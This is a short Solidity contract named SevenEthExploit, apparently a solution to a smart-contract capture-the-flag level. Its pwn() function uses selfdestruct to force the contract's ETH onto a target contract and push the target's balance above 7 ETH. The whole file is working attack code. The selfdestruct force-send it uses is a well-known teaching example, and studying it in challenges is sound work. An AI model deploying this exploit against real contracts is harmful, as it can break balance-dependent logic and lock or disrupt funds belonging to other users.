// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract SevenEthExploit {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function pwn() external payable {
        // force send all of ETH stored in this contract
        // Force ETH balance of contract to be more than 7 ETH
        selfdestruct(target);
    }
}